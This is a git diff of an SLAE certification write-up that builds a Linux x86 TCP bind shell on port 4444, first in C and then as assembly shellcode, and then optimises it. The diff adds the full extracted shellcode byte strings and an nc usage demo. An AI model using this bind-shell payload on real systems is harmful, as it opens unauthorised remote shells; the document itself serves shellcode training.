@@ -4,7 +4,7 @@ This MD file has been created for the SecurityTube Linux Assembly Expert certifi
 
 # Exo 1 - Bind shellcode - Part 1 - C Bind Shell
 
-### *int main()*
+## *int main()*
 
 For this first exercise let's start by developing a C bind shell. Steps are:
 
@@ -17,7 +17,7 @@ For this first exercise let's start by developing a C bind shell. Steps are:
 
 For each step, **man** is used in order to find usage description of functions.
 
-### Socket
+## Socket
 
 The first step is to create a socket which will be used to listen on.
 ```C
@@ -41,7 +41,7 @@ Our C code is:
 int my_socket = socket(AF_INET, SOCK_STREAM, 0);
 ```
 
-### Bind
+## Bind
 Then socket must be bound. 
 
 ```C
@@ -72,7 +72,7 @@ my_sockaddr.sin_addr.s_addr = INADDR_ANY;
 my_sockaddr.sin_port = htons(4444);
 bind(my_socket, (struct sockaddr *)&my_sockaddr, sizeof(my_sockaddr));
 ```
-### Listen
+## Listen
 
 Let's start listening.
 
@@ -92,7 +92,7 @@ C code is:
 listen(my_socket, 0);
 ```
 
-### Accept
+## Accept
 
 Then, connections must be accepted.
 
@@ -110,7 +110,7 @@ C code:
 int my_accept = accept(my_socket, NULL, NULL);
 ```
 
-### Redirect
+## Redirect
 
 Before executing our shell we need to redirect stdin, stdout and stderr to our socket. Again, let's use the man.
 
@@ -141,7 +141,7 @@ for(i = 0; i < 3; i++)
 	dup2(my_accept, i);
 ```
 
-### Execve
+## Execve
 
 At last we can finally call execve:
 ```C
@@ -155,7 +155,7 @@ SYNOPSIS
 ```C
 execve("/bin/sh", NULL, NULL);
 ```
-### Code
+## Code
 
 Let's try to compile it by removing the includes one by one in order to remove unnecessary include. Finally, there is a C Bind Shell:
 
@@ -188,32 +188,29 @@ int main()
 }
 ```
 
-### Usage
+## Usage
 
 In a first terminal:
 
 ```
-cervoise@slae:~/exam/bind$ gcc bind_shell.c -o bind_shell cervoise@slae:~/exam/bind$ ./bind_shell
+$ gcc bind_shell.c -o bind_shell
+$ ./bind_shell
 ```
 
 In another terminal:
 ```
-cervoise@slae:~/slae/Shellcode$ netstat -laput |grep bind_shell
+$ netstat -laput |grep bind_shell
 [...]
 tcp        0      0 *:4444                  *:*                     LISTEN      21884/bind_shell   
 [...]
-cervoise@slae:~/slae/Shellcode$ nc 127.0.0.1 4444
+$ nc 127.0.0.1 4444
 id
 uid=1000(cervoise) gid=1000(cervoise) groups=1000(cervoise),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare)
 exit
-cervoise@slae:~/slae/Shellcode$ nc 127.0.0.1 4454
-$ id
-uid=1000(cervoise) gid=1000(cervoise) groups=1000(cervoise),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare)
-$ exit
 ```
-# Exo 2 - Reverse shellcode - Part 2 - Bind Shellcode
+# Exo 1 - Reverse shellcode - Part 2 - Bind Shellcode
 
-### Socket
+## Socket
 
 There is no syscall for socket. But one exists for socketcall which allows to call socket functions.
 
@@ -278,11 +275,11 @@ push 2
 mov ecx, esp
 ```
 
-EAX will now contain a reference to the socket, lets put it in EDI.
+After the syscall returns, EAX will contain a reference to the socket, lets put it in EDI.
 ```ASM
 mov edi, eax
 ```
-### Bind
+## Bind
 
 Next step is to bind the socket. Again, socketcall is used.
 ```
@@ -358,7 +355,7 @@ mov ecx, esp
 int 0x80
 ```
 
-### Listen
+## Listen
 
 Then we have to listen for the socket, we will use socketcall with *SYS_LISTEN*.
 
@@ -381,7 +378,7 @@ mov ecx, esp
 int 0x80
 ```
 
-### Accept
+## Accept
 The syscall number is checked.
 ```
 $ for elmt in $(locate net.h); do grep SYS_ACCEPT $elmt; done
@@ -404,12 +401,12 @@ mov ecx, esp
 int 0x80
 ```
 
-As the result will be used on the next syscall (by EBX), lets put the result in EBX.
+As the result will be used on the next syscall (by EBX), let's put it in EBX.
 
 ```ASM
 mov ebx, eax
 ```
-### Dup
+## Dup
 The syscall number is checked and converted in hexadecimal.
 ```
 $ cat /usr/include/i386-linux-gnu/asm/unistd_32.h |grep dup2
@@ -455,7 +452,7 @@ duploop:
 ```
 
 
-### Execve
+## Execve
 The syscall number is checked.
 
 ```
@@ -480,7 +477,7 @@ callexecve:
 	db "Hello World!", 0xA
 ```
 
-### Exit gracefully
+## Exit gracefully
 This code is from the course. It must be inserted after execve execution but before *callexecve*.
 
 ```ASM
@@ -489,7 +486,7 @@ mov al, 1
 int 0x80
 ```
 
-### Final code
+## Final code
 
 ```ASM
 global _start
@@ -581,7 +578,7 @@ callexecve:
 	db "/bin/sh"
 ```
 
-### Compilation
+## Compilation
 
 Compilation is done using *nasm*:
 ```
@@ -606,7 +603,12 @@ else
 fi
 ```
 
-### Execution
+```
+$ bash get-shellcode.sh bind_shellcode.o 
+"\x31\xc0\xb0\x66\x31\xdb\xb3\x01\x31\xc9\x51\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc7\x31\xc0\x50\x66\x68\x11\x5c\x66\x6a\x02\x89\xe2\xb0\x66\xb3\x02\x6a\x10\x52\x57\x89\xe1\xcd\x80\x31\xc0\xb0\x66\xb3\x04\x50\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x05\x31\xc9\x51\x51\x57\x89\xe1\xcd\x80\x89\xc3\x31\xc9\xb1\x02\x31\xc0\xb0\x3f\xcd\x80\x49\x79\xf7\xeb\x0f\xb0\x0b\x5b\x31\xc9\x31\xd2\xcd\x80\x31\xc0\xb0\x01\xcd\x80\xe8\xec\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"
+```
+
+## Execution
 
 Our C shellcode launcher file is:
 ```C
@@ -649,27 +651,27 @@ The shellcode size is 114, next step is to reduce it!
 
 In this part optimisation is done to reduce the shellcode length. Only successful tries are reported here.
 
-### Socket call
+## Socket call
 
 EBX is set to 0x1 (because of previous *mov bl, 1*), let's see if *push ebx* is shorter than *push 0x1*
 
-```
+```ASM
 8048060:	6a 01                	push   0x1
 8048062:	53                   	push   ebx
 ```
 
-### Bind
+## Bind
 
 In the bind part there is a *mov bl, 0x2*. As EBX is already set to 0x1, let's see if inc is shorted:
 
-```
+```ASM
 8048060:	b3 02                	mov    bl,0x2
 8048062:	43                   	inc    ebx
 ```
  
 Before this section, 0x2 is pushed. As *push bx* is shorter than *pushw 0x2*, we can put the inc ebx at the beginning of this part and *push bx*
 
-```
+```ASM
 8048060:	66 6a 02             	pushw  0x2
 8048063:	66 53                	push   bx
 ```
@@ -710,11 +712,11 @@ mov ecx, esp
 int 0x80
 ```
  
-### Accept
+## Accept
 
 Again, we put 0x5 in bl but bl is already set to 0x4. Inc is shorted
 
-``` 
+```ASM
 8048060:	b3 05                	mov    bl,0x5
 8048062:	43                   	inc    ebx
 ```
@@ -723,17 +725,17 @@ At the end of the accept part, EAX is put in EBX. Few instructions later EAX is 
 
 Let's check if we can exchange value (*xchg* instruction) between EAX and EBX. As EBX value is known, EAX will not need to be set to 0 before to put 0x3F in AL
 
-```  
+```ASM
 8048060:	89 c3                	mov    ebx,eax
 8048062:	31 c0                	xor    eax,eax
 8048064:	93                   	xchg   ebx,eax
 ```
 
-### Excevec
+## Excevec
 
 Because of the loop, ecx is set to -1. Lets check if *inc ecx* is not shorter than *xor ecx,ecx*
 
-```
+```ASM
 8048060:	31 c9                	xor    ecx,ecx
 8048062:	41                   	inc    ecx
 ```
@@ -742,7 +744,7 @@ Let's check if it is not possible to put the PATH of the executed program on the
 
 Original code:
 
-```
+```ASM
 00000000 <execve-0x2>:
    0:	eb 0f                	jmp    11 <callexecve>
 
@@ -768,7 +770,7 @@ Length is 28.
 
 Now, let's try to put "/bin/sh" on the stack. As null byte must be avoided, the PATH is padded using "/". Here "/bin/sh" became "//bin/sh"
 
-```
+```ASM
    0:	b0 0b                	mov    al,0xb
    2:	31 c9                	xor    ecx,ecx
    4:	51                   	push   ecx
@@ -783,17 +785,17 @@ Length is 21 (with 1 byte for padding). The maximum will be 3 bytes of padding. 
 
 Also, there is a *xor edx, edx* in the code. The *cdq* instruction will convert a double word to a quad word from EAX to EAX and EDX. If EAX is null, EDX will be set to null. *cdq* is only a one byte instruction.
 
-### Exit
+## Exit
 
 Last improvement, the exit can be removed:
 
-```
+```ASM
  8048060:	31 c0                	xor    eax,eax
  8048062:	b0 01                	mov    al,0x1
  8048064:	cd 80                	int    0x80
 ```
 
-### Optimised shellcode
+## Optimised shellcode
 
 ```ASM
 global _start
@@ -874,17 +876,17 @@ duploop:
 	int 0x80
 ```
 
-### Compilation
+## Compilation
 
 Compilation is done using *nasm*:
 ```
 $ nasm -f elf32 -o bind_shellcode_lite.o bind_shellcode_lite.nasm
-$ get-shellcode.sh bind_shellcode_lite.o
+$ bash get-shellcode.sh bind_shellcode_lite.o
 "\x31\xc0\xb0\x66\x31\xdb\xb3\x01\x31\xc9\x51\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc7\x31\xc0\x50\x66\x68\x11\x5c\x43\x66\x53\x89\xe2\xb0\x66\x6a\x10\x52\x57\x89\xe1\xcd\x80\x31\xc0\xb0\x66\xb3\x04\x50\x57\x89\xe1\xcd\x80\xb0\x66\x43\x31\xc9\x51\x51\x57\x89\xe1\xcd\x80\x93\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x99\xcd\x80"
 
 ```
 
-### Execution
+## Execution
 
 Our C shellcode launcher file is:
 ```C
@@ -922,9 +924,9 @@ Shellcode length was reduced of 16 bytes.
 
 # Exo 1 - Bind shellcode - Part 4 - Bind Shellcode Generator
 
-In this post, I will create Python 3 scripts for easily generate shellcode by choosing the TCP port to listen on and the shell to run (in case of /bin/sh is not available). As both JMP CALL POP and pushing the path on the stack were used, two scripts will be done.
+In this post, I will create a Python 3 script (compatible with Python 2) for easily generate shellcode by choosing the TCP port to listen on and the shell to run (in case of /bin/sh is not available).
 
-### Handle the port
+## Handle the port
 
 Main fact with the port is to set the port in hexadecimal using
  little endian.
@@ -940,7 +942,7 @@ else:
    port = hex(port)
 ```
 
-### Handle the path
+## Handle the path
 
 For the PATH pushed on the stack we have to add padding to avoid null byte by adding slash(es).
 
@@ -966,7 +968,7 @@ for doubleword in result[len(result)::-1]:
 
 ```
 
-### Python code
+## Python code
 
 ```python
 #!python3
